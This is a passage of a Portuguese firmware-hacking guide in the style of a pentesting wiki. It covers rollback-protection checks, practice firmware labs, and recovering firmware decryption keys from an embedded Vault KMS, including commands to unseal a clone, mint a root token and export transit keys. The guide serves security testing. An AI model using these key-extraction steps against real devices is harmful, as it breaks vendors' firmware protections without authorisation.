- Rotinas de apagamento ou recuperação que mantêm o slot marcado como inicializável mesmo depois que seu conteúdo é removido e regravado.

### Checklist para avaliar a lógica de atualização

* O transporte/autenticação do *endpoint de atualização* está adequadamente protegido (TLS + autenticação)?
* O dispositivo compara **números de versão** ou um **contador monotônico anti-rollback** antes de gravar o firmware?
* A imagem é verificada dentro de uma cadeia de secure boot (por exemplo, assinaturas verificadas pelo código da ROM)?
* O **bootloader aplica o mesmo ratchet** que o updater, em vez de apenas verificar a assinatura/CRC?
* Os metadados de ativação do slot estão **vinculados ao digest/à versão do firmware validado**, ou o slot pode ser modificado após a promoção?
* Após a troca de slot ser bem-sucedida, o dispositivo é forçado a reiniciar ou as rotinas posteriores de atualização/apagamento continuam acessíveis na mesma sessão?
* O código do userland realiza verificações adicionais de integridade (por exemplo, mapa de partições permitido, número do modelo)?
* Os fluxos de atualização *parcial* ou de *backup* reutilizam a mesma lógica de validação?

> 💡  Se algum dos itens acima estiver ausente, a plataforma provavelmente é vulnerável a ataques de rollback.

## Firmware vulnerável para praticar

Para praticar a descoberta de vulnerabilidades em firmware, use os seguintes projetos de firmware vulnerável como ponto de partida.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperando chaves de descriptografia de firmware a partir do estado de KMS/Vault incorporado

Quando uma imagem de atualização combina pequenos metadados em texto simples com um grande blob de alta entropia, faça a triagem do contêiner antes de tentar qualquer brute force:<sup>[[1]](#references)</sup>

- Extraia cabeçalhos, offsets e limites de linha com `hexdump`, `xxd`, `strings -tx`, `base64 -d` e `binwalk -E`.
- `Salted__` geralmente indica o formato `enc` do OpenSSL: os próximos 8 bytes são o salt e os bytes restantes são o ciphertext.
- Um campo Base64 que decodifica para exatamente `256` bytes é uma forte indicação de que você está vendo um ciphertext RSA-2048 que encapsula uma senha aleatória de firmware/chave de sessão.
- Material PGP destacado no mesmo arquivo geralmente protege apenas a autenticidade; não presuma que seja o mecanismo de confidencialidade.

Se a busca estática por chaves (`grep`, `strings`, buscas por PEM/PGP) não funcionar, faça reverse engineering do **fluxo operacional de descriptografia**, em vez de apenas procurar chaves privadas:

- Descompile o updater / binário de gerenciamento e rastreie quem lê o blob criptografado, qual helper/API o decifra e qual nome lógico de chave ele solicita.
- Pesquise no root filesystem extraído o estado de KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), além de arquivos de unit e scripts de init.
- Trate comandos `vault operator unseal ...` em texto simples, chaves de recuperação, tokens de bootstrap ou scripts locais de auto-unseal do KMS como equivalentes a material de chave privada.

Se o appliance incluir o binário original do Vault e o backend de armazenamento, reproduzir esse ambiente costuma ser mais fácil do que reimplementar os componentes internos do Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Com root no KMS clonado:

- Torne as chaves transit exportáveis somente dentro do clone isolado: `vault write transit/keys/<name>/config exportable=true`
- Exporte a chave unwrap: `vault read transit/export/encryption-key/<name>`
- Teste a chave RSA recuperada com o par exato de padding/hash usado pelo KMS. Uma falha na descriptografia PKCS#1 v1.5 e uma falha na descriptografia OAEP padrão **não** provam que a chave está errada; muitos fluxos baseados no Vault usam OAEP com SHA-256, enquanto as bibliotecas comuns usam SHA-1 por padrão.
- Se o payload começar com `Salted__`, reproduza exatamente o KDF OpenSSL do fornecedor (`EVP_BytesToKey`, geralmente MD5 em aparelhos antigos) antes de tentar a descriptografia AES-CBC.

Isso transforma o "firmware criptografado" em um problema mais geral: **recuperar as chaves operacionais do lado do aparelho e, em seguida, reproduzir offline os parâmetros exatos de unwrap + KDF**.

## Treinamento e Certificações

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Quebrando firmware com Claude: habilidade de nível sênior, autonomia de nível júnior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologia de teste de segurança de firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking prático de IoT: o guia definitivo para atacar a Internet das Coisas](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Explorando zero-days em hardware abandonado – blog da Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Como um dispositivo inteligente de US$ 20 me deu acesso à sua casa](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Agora você me vê: agora você foi comprometido](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Explorando o Tesla Wall Connector pelo conector da porta de carregamento - Parte 2: contornando a proteção contra downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Faça piscar: exploração over-the-air do Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS no QEMU, Parte 2: depuração e correção](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
{{#include ../../banners/hacktricks-training.md}}
